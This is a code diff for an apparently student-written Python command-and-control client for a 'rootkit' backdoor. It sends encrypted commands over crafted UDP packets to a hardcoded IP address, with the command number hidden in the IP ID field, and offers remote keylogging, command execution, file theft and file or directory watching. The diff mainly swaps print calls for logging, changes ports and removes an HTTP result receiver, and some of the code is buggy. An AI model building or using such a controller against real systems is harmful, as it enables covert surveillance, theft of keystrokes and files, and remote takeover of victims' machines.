@@ -1,35 +1,30 @@
-import os
-import struct
-import time
-
-from cryptography.fernet import Fernet
-
 from encryption import encryption
-
 from scapy.all import *
 from scapy.layers.inet import IP, UDP
+import logging
+import HttpServerReceiver
 
 key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
 code = "secret"
-SIZE = 4379
+SIZE = 1024
 
 
 def main():
     # ip = input("Enter backdoor IP: ")
     ip = "192.168.1.26"
     controller = c2(ip)
-    controller.results_receiver()
-    if controller.connect():
+    try:
         while True:
             opt = menu()
             if menu_parse(opt, controller) == 1:
                 break
-
+    except KeyboardInterrupt:
+        pass
 
 
 def menu():
-    print("1. start key log\n2. stop key log\n3. execute command\n4. retrieve file\n5. start watching file\n6. stop "
-          "watching file\n7. start watching directory\n8. stop watching directory\n9. exit")
+    logging.info("1. start key log\n2. stop key log\n3. execute command\n4. retrieve file\n5. start watching file\n6. "
+                 "stop watching file\n7. start watching directory\n8. stop watching directory\n9. exit")
     option = input()
     return option
 
@@ -65,7 +60,7 @@ def menu_parse(option, controller):
             return 1
         case _:
             os.system("clear")
-            print("Select a valid option")
+            logging.info("Select a valid option")
             return 0
 
 
@@ -74,37 +69,33 @@ class c2:
         self.kit_ip = ip
         self.encrypter = encryption(key)
 
-    def connect(self):
-        print("connect to rootkit")
-        return True
-
     def opt_keylog(self, opt):
         match opt:
             case 0:
-                print("Start keylogger")
+                logging.info("Start keylogger")
                 self.command_sender(1, "blankdata")
             case 1:
-                print("Stop keylogger")
+                logging.info("Stop keylogger")
                 self.command_sender(2, "blankdata")
             case _:
-                print("Error")
+                logging.debug("Error")
 
     def opt_execute(self, opt):
+        logging.info("Executing command:"+opt)
         self.command_sender(3, opt)
-        print(opt)
 
     def opt_file_get(self, opt):
+        logging.info("Getting file:"+opt)
         self.command_sender(4, opt)
-        print(opt)
 
     def opt_file_watch(self, opt, file):
         match opt:
             case 0:
                 self.command_sender(5, opt)
-                print("Start watching file "+file)
+                logging.info("Start watching file:" + file)
             case 1:
                 self.command_sender(6, opt)
-                print("Stop watching file "+file)
+                logging.info("Stop watching file:" + file)
             case _:
                 print("Error")
 
@@ -112,12 +103,12 @@ class c2:
         match opt:
             case 0:
                 self.command_sender(7, directory)
-                print("Start watching directory "+directory)
+                logging.info("Start watching directory:" + directory)
             case 1:
                 self.command_sender(8, directory)
-                print("Stop watching directory "+directory)
+                logging.info("Stop watching directory:" + directory)
             case _:
-                print("Error")
+                logging.debug("Error")
 
     def disconnect(self):
         print("disconnect from rootkit")
@@ -126,32 +117,10 @@ class c2:
     # Example stopping keylog: port 52 (arbitrary right now), ID=XXX2 (last digit as 2),
     def command_sender(self, opt, data):
         rand_id = int(str(random.randrange(100, 999)) + str(opt))
-        port = 5000
+        port = 10001
         encrypted_data = self.encrypter.encrypt(code + ":" + data)
-        #s = struct.pack('bb', dchar, dchar1)
-        dgram = IP(dst=self.kit_ip, id=rand_id / UDP(dport=port) / encrypted_data)
+        dgram = IP(dst=self.kit_ip, id=rand_id / UDP(dport=port, len=len(encrypted_data)) / encrypted_data)
         send(dgram, verbose=0)
-
-    # http.server module?
-    def results_receiver(self):
-        server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
-        server.bind((socket.gethostbyname(socket.gethostname()), 80))
-        while True:
-            data_len = 0
-            data_recv = -1
-            server.listen(1)
-            while True:
-                conn, addr = server.accept()
-                try:
-                    while data_recv != data_len:
-                        data = conn.recv(SIZE)
-                        if data_len == 0:
-                            print("get length")
-                            break
-                finally:
-                    conn.close()
-                    break
-        print("receive http")
 
 
 if __name__ == '__main__':
